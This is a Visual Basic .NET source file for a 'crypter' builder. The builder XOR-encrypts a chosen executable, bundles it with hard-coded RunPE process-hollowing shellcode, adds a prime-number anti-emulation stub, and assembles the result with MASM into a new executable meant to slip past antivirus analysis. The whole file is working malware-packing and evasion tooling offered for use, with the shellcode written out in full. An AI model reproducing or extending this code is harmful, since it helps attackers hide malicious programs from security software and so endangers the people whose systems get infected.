Imports System.Text
Imports System.IO

Public Class FrmBuilder
    Dim EncryptionKey As String = ""
    Dim MasmPath As String = "" 'Holds MasmPath variable
    Dim ShellParserObject As New ShellParse
    Dim InputExecutable As ShellParse.ShellCode
    Dim RunPE As ShellParse.ShellCode
    'List of primes for prime number anti emulation
    Dim PrimeArray As Integer() = {2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999, 3001, 3011, 3019, 3023, 3037, 3041, 3049, 3061, 3067, 3079, 3083, 3089, 3109, 3119, 3121, 3137, 3163, 3167, 3169, 3181, 3187, 3191, 3203, 3209, 3217, 3221, 3229, 3251, 3253, 3257, 3259, 3271, 3299, 3301, 3307, 3313, 3319, 3323, 3329, 3331, 3343, 3347, 3359, 3361, 3371, 3373, 3389, 3391, 3407, 3413, 3433, 3449, 3457, 3461, 3463, 3467, 3469, 3491, 3499, 3511, 3517, 3527, 3529, 3533, 3539, 3541, 3547, 3557, 3559, 3571, 3581, 3583, 3593, 3607, 3613, 3617, 3623, 3631, 3637, 3643, 3659, 3671, 3673, 3677, 3691, 3697, 3701, 3709, 3719, 3727, 3733, 3739, 3761, 3767, 3769, 3779, 3793, 3797, 3803, 3821, 3823, 3833, 3847, 3851, 3853, 3863, 3877, 3881, 3889, 3907, 3911, 3917, 3919, 3923, 3929, 3931, 3943, 3947, 3967, 3989, 4001, 4003, 4007, 4013, 4019, 4021, 4027, 4049, 4051, 4057, 4073, 4079, 4091, 4093, 4099, 4111, 4127, 4129, 4133, 4139, 4153, 4157, 4159, 4177, 4201, 4211, 4217, 4219, 4229, 4231, 4241, 4243, 4253, 4259, 4261, 4271, 4273, 4283, 4289, 4297, 4327, 4337, 4339, 4349, 4357, 4363, 4373, 4391, 4397, 4409, 4421, 4423, 4441, 4447, 4451, 4457, 4463, 4481, 4483, 4493, 4507, 4513, 4517, 4519, 4523, 4547, 4549, 4561, 4567, 4583, 4591, 4597, 4603, 4621, 4637, 4639, 4643, 4649, 4651, 4657, 4663, 4673, 4679, 4691, 4703, 4721, 4723, 4729, 4733, 4751, 4759, 4783, 4787, 4789, 4793, 4799, 4801, 4813, 4817, 4831, 4861, 4871, 4877, 4889, 4903, 4909, 4919, 4931, 4933, 4937, 4943, 4951, 4957, 4967, 4969, 4973, 4987, 4993, 4999}
    Dim RunPEShellCode As String = "55,8B,EC,81,C4,A4,FA,FF,FF,89,45,FC,E8,1B,02,00,00,89,85,CC,FD,FF,FF,BB,F2,0F,56,C6,8B,95,CC,FD,FF,FF,E8,19,02,00,00,89,45,F8,BB,A9,8B,80,2D,8B,95,CC,FD,FF,FF,E8,06,02,00,00,89,45,F4,BB,85,3B,AE,DB,8B,95,CC,FD,FF,FF,E8,F3,01,00,00,89,45,F0,BB,93,35,DF,85,8B,95,CC,FD,FF,FF,E8,E0,01,00,00,89,45,EC,BB,8D,CB,B6,5D,8B,95,CC,FD,FF,FF,E8,CD,01,00,00,89,45,E8,BB,53,13,C1,78,8B,95,CC,FD,FF,FF,E8,BA,01,00,00,89,45,E4,BB,8A,DB,DF,A5,8B,95,CC,FD,FF,FF,E8,A7,01,00,00,89,45,E0,BB,2E,05,50,C8,8B,95,CC,FD,FF,FF,E8,94,01,00,00,89,45,DC,BB,85,A1,16,A2,8B,95,CC,FD,FF,FF,E8,81,01,00,00,E8,06,00,00,00,6E,74,64,6C,6C,00,5F,57,FF,D0,89,85,D0,FD,FF,FF,BB,8B,E3,CD,41,8B,D0,E8,60,01,00,00,89,45,D8,BB,39,23,0D,2C,8B,95,D0,FD,FF,FF,E8,4D,01,00,00,89,45,D4,68,00,02,00,00,8D,85,D4,FD,FF,FF,50,6A,00,FF,55,F8,6A,44,8D,85,88,FD,FF,FF,50,FF,55,D4,FF,55,F4,8B,C8,8D,85,78,FD,FF,FF,50,8D,85,88,FD,FF,FF,50,6A,00,6A,00,6A,04,6A,00,6A,00,6A,00,51,8D,85,D4,FD,FF,FF,50,FF,55,F0,68,CC,02,00,00,8D,85,A4,FA,FF,FF,50,FF,55,D4,C7,85,A4,FA,FF,FF,02,00,01,00,8D,85,A4,FA,FF,FF,50,FF,B5,7C,FD,FF,FF,FF,55,EC,64,A1,30,00,00,00,8B,40,0C,8B,40,14,8B,40,10,50,FF,B5,78,FD,FF,FF,FF,55,D8,8B,7D,FC,03,7F,3C,6A,40,68,00,30,00,00,FF,77,50,FF,77,34,FF,B5,78,FD,FF,FF,FF,55,E8,89,85,74,FD,FF,FF,6A,00,FF,77,54,FF,75,FC,FF,B5,74,FD,FF,FF,FF,B5,78,FD,FF,FF,FF,55,E4,8D,47,18,89,85,70,FD,FF,FF,0F,B7,47,14,01,85,70,FD,FF,FF,33,C0,33,F6,33,C9,90,90,6B,C6,28,03,85,70,FD,FF,FF,8B,9D,74,FD,FF,FF,03,58,0C,8B,55,FC,03,50,14,6A,00,FF,70,10,52,53,FF,B5,78,FD,FF,FF,FF,55,E4,46,66,3B,77,06,72,D1,8B,85,74,FD,FF,FF,03,47,28,89,85,54,FB,FF,FF,8D,85,A4,FA,FF,FF,50,FF,B5,7C,FD,FF,FF,FF,55,E0,FF,B5,7C,FD,FF,FF,FF,55,DC,C9,C3,64,A1,30,00,00,00,8B,40,0C,8B,40,0C,8B,00,8B,00,8B,40,18,C3,55,8B,EC,83,C4,F4,52,89,55,FC,8B,4A,3C,03,CA,89,4D,F4,8B,49,78,03,CA,89,4D,F8,8B,51,18,8B,49,20,03,4D,FC,33,FF,8B,31,03,75,FC,33,C0,51,AC,8B,C8,03,F8,D3,C7,85,C0,75,F5,59,3B,FB,74,10,83,C1,04,4A,75,E0,BA,C2,58,62,1B,5A,33,C0,C9,C3,8B,45,FC,8B,4D,F8,8B,59,18,8B,49,24,03,C8,2B,DA,D1,E3,03,CB,0F,B7,19,8B,4D,F8,8B,49,1C,03,C8,C1,E3,02,03,CB,03,01,5A,C9,C3"
    Private Sub CryptBtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CryptBtn.Click
        Dim SaveFile As New SaveFileDialog
        SaveFile.Filter = "Executables *.exe|*.exe"
        If SaveFile.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim TempPath As String = System.IO.Path.GetTempPath 'Store data in temp
            GenerateEncryptionKey()
            Dim ParsedInput As String = ShellParserObject.ParseExe(FileText.Text)
            InputExecutable = ShellParserObject.ByteXorExecutable(ParsedInput, EncryptionKey, "dwEXEArray", 16)
            RunPE = ShellParserObject.ByteXorExecutable(RunPEShellCode, EncryptionKey, "szShellCode", 20)
            Dim RunPEEdit As String = File.ReadAllText(RunPE.OutputLocation) 'Files are dumped to disk to save memory
            File.WriteAllText(TempPath + "byte.inc", ".data" & vbNewLine & System.IO.File.ReadAllText(InputExecutable.OutputLocation) & vbNewLine & RunPEEdit.Substring(0, RunPEEdit.Length - 1)) 'last character of shellcode is extra comma for no reason this gets rid of it
            File.Delete(InputExecutable.OutputLocation)
            File.Delete(RunPE.OutputLocation)
            Dim StubCode As String = My.Resources.StubCode
            Dim PrimaryPrime As Integer = GeneratePrimeNumber()
            Dim PrimeIndex As Integer = Array.IndexOf(PrimeArray, PrimaryPrime)
            StubCode = StubCode.Replace("%key%", ToBinary(EncryptionKey) & "b") 'Substitute the variables with data
            StubCode = StubCode.Replace("%shellen%", InputExecutable.KeyLength - 695)
            StubCode = StubCode.Replace("%maxprime%", PrimeIndex + 1)
            StubCode = StubCode.Replace("%primeadder%", InputExecutable.KeyLength - PrimaryPrime)
            File.WriteAllText(TempPath + "\stub.asm", StubCode)
            Shell(MasmPath + "\bin\ml.exe /c /coff /Cp /nologo /Fo " + Chr(34) + "C:\stub.obj" + Chr(34) + " /I" + Chr(34) + "\Masm32\Include" + Chr(34) + " " + Chr(34) + "C:\stub.asm" + Chr(34))
            System.Threading.Thread.Sleep(InputExecutable.KeyLength / 100) 'Assembling takes a little bit, you can edit this for your own faster machine or smaller files
            Shell(MasmPath + "\bin\Link.exe /SUBSYSTEM:WINDOWS /RELEASE /VERSION:4.0 " + Chr(34) + "/LIBPATH:\Masm32\Lib" + Chr(34) + " " + Chr(34) + "C:\stub.obj" + Chr(34) + " " + Chr(34) + "/OUT:" + Chr(34) + "C:\stub.exe" + Chr(34))
            System.Threading.Thread.Sleep(InputExecutable.KeyLength / 100) 'Linking takes less timet, you can edit this for your own faster machine or smaller files
            File.Copy(TempPath + "stub.exe", SaveFile.FileName) 'Copy to output
            'Clean up drive
            File.Delete(TempPath + "byte.inc")
            File.Delete(TempPath + "stub.asm")
            File.Delete(TempPath + "stub.obj")
            File.Delete(TempPath + "stub.exe")
            MsgBox("Encryption sucessful", MsgBoxStyle.OkOnly, "Complete")
        End If
    End Sub
    Function ReturnRandomPrime()
        Dim RNG As Random = New Random()
        Return PrimeArray(RNG.Next(0, PrimeArray.Length - 1))
    End Function
    Private Sub FrmBuilder_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Randomize()
        MasmPath = Environment.GetEnvironmentVariable("MASM32_PATH")
        If MasmPath.Length = 0 Then
            MsgBox("MASM not found on computer, please download and install it.", MsgBoxStyle.OkOnly, "Error: No compiler")
            Application.Exit()
        End If
    End Sub
    Function GeneratePrimeNumber()
        Dim PrimaryPrime As Integer = ReturnRandomPrime()
        If PrimaryPrime > InputExecutable.KeyLength Then
            GeneratePrimeNumber()
        End If
        Return PrimaryPrime
    End Function
    Sub GenerateEncryptionKey()
        EncryptionKey = Math.Round(Rnd() * 20)
        If EncryptionKey = 0 Then
            GenerateEncryptionKey()
        End If
    End Sub
    Function ToBinary(ByVal bin As String) As String
        Dim StringReturn As String = ""
        For Each BinVal In bin
            StringReturn &= Convert.ToString(AscW(BinVal) - 48, 2).PadLeft(4, "0"c)
        Next
        Return StringReturn
    End Function
    Private Sub BrowseBtn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BrowseBtn.Click
        Dim FileBrowse As New OpenFileDialog With {.Filter = "Executables *.exe|*.exe", .Title = "Browse for file to crypt"}
        If FileBrowse.ShowDialog = vbOK Then
            FileText.Text = FileBrowse.FileName
        End If
    End Sub
End Class
